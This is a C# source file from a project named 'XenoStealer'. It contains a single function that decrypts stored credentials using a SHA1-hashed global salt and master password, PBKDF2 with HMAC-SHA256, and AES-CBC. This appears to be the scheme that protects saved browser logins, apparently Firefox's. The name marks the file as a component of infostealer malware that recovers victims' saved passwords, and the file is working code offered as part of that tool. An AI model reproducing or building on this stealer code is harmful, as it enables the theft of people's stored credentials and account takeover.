using System;
using System.Collections.Generic;
using System.IO.Ports;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class PasswordBasedDecryption
    {
        private static SHA1Managed sha1 = new SHA1Managed();
        private static byte[] ivPrefix = new byte[] { 0x04, 0x0e };
        public static byte[] Decrypt(byte[] ciphertext, byte[] globalSalt, byte[] masterPassword, byte[] entrySalt, byte[] partIV, int iterations = 1, int keyLength = 32) 
        { 
            if (masterPassword == null) 
            {
                masterPassword = new byte[0];
            }

            byte[] globalSaltMasterPassword = new byte[globalSalt.Length + masterPassword.Length];
            Array.Copy(globalSalt, 0, globalSaltMasterPassword, 0, globalSalt.Length);
            Array.Copy(masterPassword, 0, globalSaltMasterPassword, globalSalt.Length, masterPassword.Length);

            byte[] globalSaltMasterPasswordHash = sha1.ComputeHash(globalSaltMasterPassword);

            byte[] iv = new byte[ivPrefix.Length + partIV.Length];
            Array.Copy(ivPrefix, 0, iv, 0, ivPrefix.Length);
            Array.Copy(partIV, 0, iv, ivPrefix.Length, partIV.Length);
            HMACSHA256 algo = new HMACSHA256();
            PBKDF2 pbkdf2 = new PBKDF2(algo, globalSaltMasterPasswordHash, entrySalt, iterations);
            byte[] key = pbkdf2.ComputeHash(keyLength);

            AesManaged aes = new AesManaged() 
            { 
                Mode = CipherMode.CBC,
                BlockSize = 128,
                KeySize = 256,
                Padding = PaddingMode.Zeros,
            };

            ICryptoTransform aesDecrypt = aes.CreateDecryptor(key, iv);
            byte[] decrypted = aesDecrypt.TransformFinalBlock(ciphertext, 0, ciphertext.Length);

            aesDecrypt.Dispose();
            aes.Dispose();
            algo.Dispose();
            return decrypted;
        }

            
    }
}
